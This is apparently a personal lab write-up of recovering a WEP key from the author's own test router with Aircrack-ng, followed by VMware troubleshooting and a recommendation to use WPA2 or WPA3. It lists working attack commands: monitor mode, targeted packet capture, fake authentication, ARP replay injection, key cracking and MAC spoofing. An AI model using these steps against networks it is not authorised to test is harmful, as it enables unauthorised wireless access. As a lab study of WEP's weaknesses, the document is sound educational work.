# WEP Cracking — Technical_Lab_Notes

## Purpose

This document contains the detailed technical notes, commands, observations, troubleshooting steps, and lessons learned during my WEP wireless security assessment.

> **Authorization Notice:** All wireless testing was performed against my own equipment in a controlled home lab environment.

---

# 1. Lab Environment

The following technologies were used during the assessment:

| Technology | Purpose |
|---|---|
| VMware Workstation Pro | Run and manage virtual machines |
| Kali Linux VM | Wireless security testing |
| Windows 10 VM | Lab client system |
| Realtek USB Wi-Fi Adapter | Wireless monitoring and packet injection |
| TP-Link Router | Authorised WEP test network |
| Aircrack-ng Suite | Wireless traffic capture and analysis |

---

# 2. Aircrack-ng Tools

The main tools used during the assessment were:

### `airmon-ng`

Used to configure and manage monitor mode.

### `airodump-ng`

Used to:

- Discover wireless networks
- Identify access points
- Determine encryption types
- Capture wireless packets
- Monitor IV/data collection

### `aireplay-ng`

Used to:

- Perform authorised fake authentication
- Replay captured ARP traffic
- Generate additional wireless traffic
- Increase the rate of IV collection

### `aircrack-ng`

Used to analyze captured WEP packets and attempt recovery of the shared WEP key.

---

# 3. Enable Monitor Mode

First, I checked the available wireless interfaces:

```bash
iwconfig
```

The external wireless interface used during the lab was:

```text
wlan0
```

Disable the interface:

```bash
ifconfig wlan0 down
```

Stop processes that may interfere with monitor mode:

```bash
airmon-ng check kill
```

Configure monitor mode:

 - <img width="463" height="84" alt="image" src="https://github.com/user-attachments/assets/732e8ac0-6b57-4c35-abc5-384e274513cd" />

```bash
iwconfig wlan0 mode monitor
```

Alternatively, monitor mode can be started using:

```bash
airmon-ng start wlan0
```

Verify the configuration:

```bash
iwconfig
```

The wireless interface should display:

```text
Mode:Monitor
```
  - <img width="516" height="95" alt="image" src="https://github.com/user-attachments/assets/cbae5319-ee3b-444e-943a-80f162efd57b" />

> **Note:** Wireless adapters must support monitor mode. Not every Wi-Fi adapter provides this capability.

---

# 4. Identify the Authorized WEP Network

To discover nearby 2.4 GHz wireless networks:

```bash
airodump-ng wlan0
```

To scan supported wireless bands:

```bash
airodump-ng --band abg wlan0
```

Scanning multiple bands can take longer because the adapter has to move between additional wireless channels.

---

## Recorded Test Network Information

| Information | Lab Value |
|---|---|
| BSSID | `xx:xx:xx:xx:xx:xx` |
| PWR | `-50` |
| Channel | `11` |
| ENC | `WEP` |
| ESSID | `Test_Network` |
| Beacons | `21` |
| #Data | `4` |

### Field Definitions

**BSSID**

MAC address of the wireless access point.

**PWR**

Received wireless signal strength.

For example:

```text
-38 dBm = stronger signal
-50 dBm = weaker signal
```

Values closer to zero normally represent a stronger received signal.

**Channel**

The wireless channel currently being used by the access point.

**ENC**

Wireless encryption/security protocol.

For example:

```text
WEP
WPA
WPA2
OPN
```

`OPN` indicates an open wireless network.

**ESSID**

The wireless network name.

**Beacons**

Wireless announcement frames transmitted by the access point.

**#Data**

Captured data packets.

For WEP analysis, increasing the number of captured data packets can provide additional IVs for statistical analysis.

---

# 5. Capture Wireless Traffic

Once the authorised test access point was identified, I filtered the capture to that specific BSSID and channel.

```bash
sudo airodump-ng \
--bssid xx:xx:xx:xx:xx:xx \
--channel 11 \
--write test1 \
wlan0
```

This instructed `airodump-ng` to:

- Monitor the authorised access point
- Stay on channel 11
- Capture wireless packets
- Write the capture to files beginning with `test1`

Several files may be created, including:

```text
test1-01.cap
test1-01.csv
test1-01.kismet.csv
test1-01.kismet.netxml
```

The main packet capture used later for analysis is:

```text
test1-01.cap
```

---

# 6. Generate Additional Authorised Test Traffic

When the network was not naturally generating enough traffic, additional traffic was generated within the authorised lab environment.

## Fake Authentication

The test wireless adapter was associated with the authorised access point.

```bash
sudo aireplay-ng --fakeauth 0 \
-a xx:xx:xx:xx:xx:xx \
-h 00:11:22:33:44:55 \
wlan0
```

Where:

```text
-a = MAC address / BSSID of the authorised router
-h = MAC address of the test wireless adapter
```

In this context, association does not necessarily mean obtaining normal network access.

The purpose was to establish communication with the authorised access point for the lab exercise.

---

# 7. ARP Replay

After obtaining a suitable ARP packet, it was replayed against the authorised test access point.

```bash
sudo aireplay-ng --arpreplay \
-b xx:xx:xx:xx:xx:xx \
-h 00:11:22:33:44:55 \
wlan0
```

The purpose of the ARP replay was to increase network activity.

As additional encrypted packets were transmitted, additional IVs became available for capture.

During testing, I observed the `#Data` value increasing significantly.

Example observation:

```text
#Data = 28657
```

The increased packet count provided more data for later statistical analysis.

---

# 8. Analyse the Packet Capture

After sufficient wireless traffic had been captured, the `.cap` file was analysed using Aircrack-ng.

```bash
aircrack-ng test1-01.cap
```

Aircrack-ng analyses WEP traffic and uses statistical relationships within captured IVs to attempt recovery of the shared WEP key.

The recovered key was then verified against the authorised lab network.

> Actual wireless credentials should not be published in a public GitHub repository. Any keys or passwords shown in screenshots should be redacted.

---

# 9. Results

| Test | Result |
|---|---|
| External adapter detected by Kali Linux | ✅ Successful |
| Monitor mode enabled | ✅ Successful |
| Authorised WEP network identified | ✅ Successful |
| Wireless packets captured | ✅ Successful |
| Packet injection tested | ✅ Successful |
| Sufficient IVs collected | ✅ Successful |
| WEP key recovered | ✅ Successful |
| Recovered key verified | ✅ Successful |

The assessment demonstrated that an entity within wireless range could potentially recover a WEP key after sufficient encrypted network traffic was collected.

No access to the router's administrative interface or prior knowledge of the wireless key was required during the recovery process.

---

# 10. Additional Learning

## Changing the Wireless Adapter MAC Address

During the lab I also practised changing the MAC address assigned to the external wireless adapter.

Disable the interface:

```bash
ifconfig wlan0 down
```

Assign the test MAC address:

```bash
ifconfig wlan0 hw ether 00:11:22:33:44:55
```

Enable the interface again:

```bash
ifconfig wlan0 up
```

Verify:

```bash
ifconfig wlan0
```
<img width="580" height="203" alt="image" src="https://github.com/user-attachments/assets/8426a2d5-1474-407c-8d00-9c40b63ba684" />

The MAC address of my enternal wireless adapter has been changed successfully. This technique may be useful in more advanced wireless security assessments.

---

# Troubleshooting

A significant part of the project involved troubleshooting VMware, networking, and USB connectivity problems.

---

## 11. VMware NAT Connectivity Issue

### Problem

Virtual machines configured to use VMware NAT temporarily lost internet connectivity.

### Troubleshooting Performed

First, I verified that the virtual machine was configured to use NAT:

```text
VM Settings
→ Network Adapter
→ NAT
```

I then restarted NetworkManager inside Kali Linux:

```bash
systemctl restart NetworkManager
```

I also disabled and re-enabled the VMware virtual network adapter.

When the issue persisted, I checked the VMware services running on the Windows host.

Open:

```text
services.msc
```

## VMware NAT & DHCP Service on host Windows OS:

The **VMware NAT Service** provides NAT connectivity between VMware virtual machines and the host network.

During troubleshooting, I discovered that this service was not running correctly.

Restarting the service restored NAT connectivity.

The *VMware DHCP Service* provides IP addresses to virtual machines connected to VMware-managed networks.

If this service stops working, a VM may fail to obtain a valid IP address.

This service should therefore also be checked during VMware networking troubleshooting.

  <img width="526" height="69" alt="image" src="https://github.com/user-attachments/assets/8c370874-0e8b-4e92-9b02-32f5b78b6005" />

  ### Key Learning

When experiencing VMware networking or USB connectivity issues, checking and restarting the relevant VMware services on the host machine can be an important troubleshooting step.

---

## 12. USB Wi-Fi Adapter Not Available in Kali

### Problem

The Realtek USB wireless adapter was visible on the Windows host but was not available inside the Kali Linux virtual machine.

### Resolution

The USB device was disconnected from the host and connected directly to the Kali VM using VMware's removable device options.

Example:

```text
VMware
→ VM
→ Removable Devices
→ USB Wi-Fi Adapter
→ Connect
```

The adapter then became available to Kali Linux.

---

## VMware USB Arbitration Service

The **VMware USB Arbitration Service** handles USB passthrough between the Windows host and VMware virtual machines.

If a USB device cannot be attached to the VM, checking or restarting this service can be an important troubleshooting step.

### Key Learning

USB passthrough problems may not originate inside the Linux VM.

The troubleshooting path can include:

```text
Physical USB Device
        ↓
Windows Host
        ↓
VMware USB Arbitration Service
        ↓
VMware Workstation
        ↓
Kali Linux VM
```

---

## 13. Insufficient IV Collection

### Problem

The captured packet set initially did not contain enough useful IVs for successful key recovery.

### Resolution

Additional authorised lab traffic was generated and packet capture continued.

As the amount of captured WEP traffic increased, more IVs became available for analysis.

### Key Learning

The practical weakness of WEP is not simply related to password length.

The underlying issue is the protocol's encryption design and IV reuse.

---

# 14. Important Technical Findings

## Signal Strength

A received signal strength closer to zero generally indicates a stronger wireless signal.

Example:

```text
-38 dBm > -50 dBm
```

---

## Wireless Encryption

In `airodump-ng` output:

```text
ENC = OPN
```

indicates that the network is open and does not use wireless encryption.

---

## Wireless Channels

2.4 GHz Wi-Fi commonly uses channels within the lower channel range, with the available channels depending on the country's regulatory domain.

5 GHz Wi-Fi uses higher-numbered channels and requires compatible wireless hardware.

---

# 15. WEP Security Findings

The lab demonstrated several weaknesses in WEP:

- WEP uses the RC4 stream cipher.
- WEP uses a 24-bit Initialization Vector.
- The limited IV space allows IV values to repeat.
- Repeated or weak IVs can expose statistical information about the shared key.
- IV information is transmitted with wireless traffic.
- Increased network activity increases the rate at which packets and IVs can be collected.
- Increasing the WEP password length does not correct the underlying protocol weakness.

---

# 16. Security Recommendation

WEP should not be used to secure modern wireless networks.

Where supported, wireless networks should use stronger security mechanisms such as:

```text
WPA2 + AES
```

or:

```text
WPA3
```

---

# 17. Lessons Learned

This project improved my practical understanding of:

- Wireless encryption concepts
- WEP and IV reuse
- Wireless packet capture
- Monitor mode
- Packet injection
- Aircrack-ng tools
- Linux network interface management
- VMware virtual networking
- VMware NAT troubleshooting
- USB device passthrough
- Network service troubleshooting
- Structured cybersecurity documentation

One of the most useful lessons from the project was that successful cybersecurity lab work often requires troubleshooting several layers of infrastructure rather than focusing only on the security tool itself.

---

# Conclusion

This project demonstrated how weaknesses in WEP encryption can allow a shared wireless key to be recovered from captured wireless traffic.

The project also provided hands-on experience with wireless packet analysis, Kali Linux, VMware networking, USB passthrough, and systematic troubleshooting.

The overall assessment confirms why **WEP is fundamentally insecure and should be replaced with WPA2-AES or WPA3 on modern wireless networks**.
